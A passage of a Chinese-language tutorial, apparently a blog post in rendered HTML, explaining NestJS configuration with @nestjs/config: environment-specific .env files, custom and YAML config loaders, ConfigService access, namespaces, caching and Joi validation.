class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>如果在多个文件中找到一个变量，则第一个优先。</p>\n<p>在实际开发中，往往有多个配置文件，比如开发环境使用<code>.development.env</code>配置文件，测试环境使用<code>.test.env</code>配置文件，生产环境使用<code>.production.env</code>配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下：</p>\n<figure class=\"highlight json hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// package.json</span></span><br><span class=\"line\"><span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"hljs-attr\">\"scripts\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">        <span class=\"hljs-attr\">\"start\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cross-env NODE_ENV=development nest start\"</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">        <span class=\"hljs-attr\">\"start:dev\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cross-env NODE_ENV=development nest start --watch\"</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">        <span class=\"hljs-attr\">\"start:prod\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cross-env NODE_ENV=production node dist/main\"</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">        <span class=\"hljs-attr\">\"test\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cross-env NODE_ENV=test jest\"</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">      <span class=\"hljs-punctuation\">}</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\"><span class=\"hljs-punctuation\">}</span></span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>安装<code>cross-env</code>，使用它跨平台的设置环境变量</p>\n</blockquote>\n<figure class=\"highlight typescript hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">envFilePath</span>: <span class=\"hljs-string\">`<span class=\"hljs-subst\">${process.env.NODE_ENV || <span class=\"hljs-string\">'development'</span>}</span>.env`</span>,</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"使用全局module\"><a href=\"#使用全局module\" class=\"headerlink\" title=\"使用全局module\"></a>使用全局module</h2><p>如果要<code>ConfigModule</code>在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将<code>options</code>对象的<code>isGlobal</code>属性设置为<code>true</code>，将其声明为全局模块，如下所示。在这种情况下，一旦<code>ConfigModule</code>被加载到根模块中，就不需要在其他模块中导入<code>ConfigModule</code>了</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">isGlobal</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"自定义配置文件\"><a href=\"#自定义配置文件\" class=\"headerlink\" title=\"自定义配置文件\"></a>自定义配置文件</h2><p>对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。</p>\n<p>自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。<code>process.env</code>对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> () =&gt; ({</span><br><span class=\"line\">  <span class=\"hljs-attr\">port</span>: <span class=\"hljs-built_in\">parseInt</span>(process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">PORT</span>, <span class=\"hljs-number\">10</span>) || <span class=\"hljs-number\">3000</span>,</span><br><span class=\"line\">  <span class=\"hljs-attr\">database</span>: {</span><br><span class=\"line\">    <span class=\"hljs-attr\">host</span>: process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">DATABASE_HOST</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">port</span>: <span class=\"hljs-built_in\">parseInt</span>(process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">DATABASE_PORT</span>, <span class=\"hljs-number\">10</span>) || <span class=\"hljs-number\">5432</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>将其传给<code>ConfigModule.forRoot()</code>的<code>load</code>属性，来加载这个自定义配置：</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> configuration <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./config/configuration'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      <span class=\"hljs-attr\">load</span>: [configuration],</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>load属性是个数组，允许加载多个自定义配置文件</p>\n</blockquote>\n<p>通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。</p>\n<figure class=\"highlight yaml hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-attr\">http:</span></span><br><span class=\"line\">  <span class=\"hljs-attr\">host:</span> <span class=\"hljs-string\">'localhost'</span></span><br><span class=\"line\">  <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-attr\">db:</span></span><br><span class=\"line\">  <span class=\"hljs-attr\">postgres:</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">url:</span> <span class=\"hljs-string\">'localhost'</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">5432</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">database:</span> <span class=\"hljs-string\">'yaml-db'</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-attr\">sqlite:</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">database:</span> <span class=\"hljs-string\">'sqlite.db'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>为了读取和解析YAML文件，我们可以利用<code>js-yaml</code>包。</p>\n<figure class=\"highlight shell hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">$ </span><span class=\"hljs-language-bash\">npm i js-yaml</span></span><br><span class=\"line\"><span class=\"hljs-meta\">$ </span><span class=\"hljs-language-bash\">npm i -D @types/js-yaml</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { readFileSync } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'fs'</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> yaml <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'js-yaml'</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> { join } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'path'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"variable constant_\">YAML_CONFIG_FILENAME</span> = <span class=\"hljs-string\">'config.yml'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> () =&gt; {</span><br><span class=\"line\">  <span class=\"hljs-keyword\">return</span> yaml.<span class=\"title function_\">load</span>(</span><br><span class=\"line\">    fs.<span class=\"title function_\">readFileSync</span>(<span class=\"title function_\">join</span>(__dirname, <span class=\"variable constant_\">YAML_CONFIG_FILENAME</span>), <span class=\"hljs-string\">'utf8'</span>),</span><br><span class=\"line\">  );</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"使用ConfigService\"><a href=\"#使用ConfigService\" class=\"headerlink\" title=\"使用ConfigService\"></a>使用<code>ConfigService</code></h2><p>要从<code>ConfigService</code>中访问配置值，我们首先得注入<code>ConfigService</code>，和使用其他<code>provider</code>一样，我们需要将其加入@Module的<code>imports</code>属性中（如果将<code>ConfigModule</code>配置成全局module，则可以忽略这一步）</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>],</span><br><span class=\"line\">  <span class=\"hljs-comment\">// ...</span></span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后我们可以使用标准的构造函数注入:</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// import { ConfigService } from '@nestjs/config';</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">private</span> configService: ConfigService</span>) {}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>获取</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// get an environment variable</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> dbUser = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">string</span>&gt;(<span class=\"hljs-string\">'DATABASE_USER'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// get a custom configuration value</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">string</span>&gt;(<span class=\"hljs-string\">'database.host'</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>如上所示，使用<code>configService.get()</code>方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，<code>get&lt;string&gt;(…)</code>)。<code>get()</code>方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。</p>\n<p>你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">DatabaseConfig</span> {</span><br><span class=\"line\">  <span class=\"hljs-attr\">host</span>: <span class=\"hljs-built_in\">string</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">port</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> dbConfig = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"title class_\">DatabaseConfig</span>&gt;(<span class=\"hljs-string\">'database'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// you can now use `dbConfig.port` and `dbConfig.host`</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> port = dbConfig.<span class=\"hljs-property\">port</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>get()</code>方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示:</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// use \"localhost\" when \"database.host\" is not defined</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">string</span>&gt;(<span class=\"hljs-string\">'database.host'</span>, <span class=\"hljs-string\">'localhost'</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>ConfigService</code>有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下:</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">EnvironmentVariables</span> {</span><br><span class=\"line\">  <span class=\"hljs-attr\">PORT</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"hljs-attr\">TIMEOUT</span>: <span class=\"hljs-built_in\">string</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-comment\">// somewhere in the code</span></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">private</span> configService: ConfigService&lt;EnvironmentVariables&gt;</span>) {</span><br><span class=\"line\">  <span class=\"hljs-comment\">// this is valid</span></span><br><span class=\"line\">  <span class=\"hljs-keyword\">const</span> port = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">number</span>&gt;(<span class=\"hljs-string\">'PORT'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-comment\">// this is invalid as URL is not a property on the EnvironmentVariables interface</span></span><br><span class=\"line\">  <span class=\"hljs-keyword\">const</span> url = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">string</span>&gt;(<span class=\"hljs-string\">'URL'</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"配置命名空间\"><a href=\"#配置命名空间\" class=\"headerlink\" title=\"配置命名空间\"></a>配置命名空间</h2><p><code>ConfigModule</code>允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { registerAs } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'@nestjs/config'</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"title function_\">registerAs</span>(<span class=\"hljs-string\">'database'</span>, <span class=\"hljs-function\">() =&gt;</span> ({</span><br><span class=\"line\">  <span class=\"hljs-attr\">host</span>: process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">DATABASE_HOST</span>,</span><br><span class=\"line\">  <span class=\"hljs-attr\">port</span>: process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">DATABASE_PORT</span> || <span class=\"hljs-number\">5432</span></span><br><span class=\"line\">}));</span><br></pre></td></tr></tbody></table></figure>\n\n<p>用<code>forRoot()</code>方法的参数对象的<code>load</code>属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> databaseConfig <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./config/database.config'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      <span class=\"hljs-attr\">load</span>: [databaseConfig],</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>现在，要从<code>database</code>命名空间中获取<code>host</code>，使用点操作符。使用<code>database</code>作为属性名的前缀，对应于命名空间的名称（作为 <code>registerAs()</code> 函数的第一个参数传递）。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"hljs-property\">configService</span>.<span class=\"hljs-property\">get</span>&lt;<span class=\"hljs-built_in\">string</span>&gt;(<span class=\"hljs-string\">'database.host'</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>一个合理的选择是直接注入<code>database</code>命名空间。这使我们能够从强类型化中获益。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-comment\">// import { ConfigType } from '@nestjs/config';</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"hljs-params\"></span></span><br><span class=\"line\"><span class=\"hljs-params\">  <span class=\"hljs-meta\">@Inject</span>(databaseConfig.KEY)</span></span><br><span class=\"line\"><span class=\"hljs-params\">  <span class=\"hljs-keyword\">private</span> dbConfig: ConfigType&lt;<span class=\"hljs-keyword\">typeof</span> databaseConfig&gt;,</span></span><br><span class=\"line\"><span class=\"hljs-params\"></span>) {}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"缓存环境变量\"><a href=\"#缓存环境变量\" class=\"headerlink\" title=\"缓存环境变量\"></a>缓存环境变量</h2><p>由于访问<code>process.env</code>会很慢，你可以设置传递给<code>ConfigModule.forRoot()</code>的<code>options</code>对象的<code>cache</code>属性，以提高<code>ConfigService</code>的性能。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">cache</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"部分注册\"><a href=\"#部分注册\" class=\"headerlink\" title=\"部分注册\"></a>部分注册</h2><p>到目前为止，我们已经用<code>forRoot()</code>方法处理了根模块(如<code>AppModule</code>)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。<code>@nestjs/config</code>包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用<code>forFeature()</code>静态方法来执行这个部分注册，如下所示。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> databaseConfig <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./config/database.config'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forFeature</span>(databaseConfig)],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">DatabaseModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"校验环境变量\"><a href=\"#校验环境变量\" class=\"headerlink\" title=\"校验环境变量\"></a>校验环境变量</h2><p>如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。<code>@nestjsconfig</code>包有两种不同的方式来实现这一点。</p>\n<ul>\n<li><a href=\"https://github.com/sideway/joi\">Joi</a>内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。</li>\n<li>一个自定义的<code>validate()</code>函数，它接受环境变量作为输入。</li>\n</ul>\n<p>要使用Joi，我们必须安装Joi包:</p>\n<figure class=\"highlight shell hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">$ </span><span class=\"hljs-language-bash\">yarn add joi</span></span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(<a href=\"https://github.com/sideway/joi/issues/2262)%E3%80%82\">https://github.com/sideway/joi/issues/2262)。</a></p>\n</blockquote>\n<p>现在我们可以定义一个Joi验证模式，并通过<code>forRoot()</code>方法的选项对象的<code>validationSchema</code>属性传递，如下图所示。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> <span class=\"title class_\">Joi</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'joi'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">      <span class=\"hljs-attr\">validationSchema</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">object</span>({</span><br><span class=\"line\">        <span class=\"hljs-attr\">NODE_ENV</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">string</span>()</span><br><span class=\"line\">          .<span class=\"title function_\">valid</span>(<span class=\"hljs-string\">'development'</span>, <span class=\"hljs-string\">'production'</span>, <span class=\"hljs-string\">'test'</span>, <span class=\"hljs-string\">'provision'</span>)</span><br><span class=\"line\">          .<span class=\"title function_\">default</span>(<span class=\"hljs-string\">'development'</span>),</span><br><span class=\"line\">        <span class=\"hljs-attr\">PORT</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">number</span>().<span class=\"title function_\">default</span>(<span class=\"hljs-number\">3000</span>),</span><br><span class=\"line\">      }),</span><br><span class=\"line\">    }),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 <code>NODE_ENV</code>和<code>PORT</code>设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 <code>required()</code> 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。</p>\n<p>默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过<code>forRoot()</code>选项对象的<code>validationOptions</code>键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。</p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> <span class=\"title class_\">Joi</span> 